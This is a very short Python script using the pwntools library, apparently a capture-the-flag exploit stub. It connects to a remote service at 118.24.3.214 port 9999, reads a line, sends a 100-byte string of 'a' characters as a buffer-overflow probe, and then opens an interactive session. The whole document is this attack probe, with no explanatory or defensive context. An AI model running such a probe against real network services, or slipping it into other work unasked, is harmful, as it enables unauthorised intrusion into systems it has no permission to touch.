from pwn import *

p = remote("118.24.3.214" , 9999)
p.recvline()
p.send("a" * 100)
p.interactive()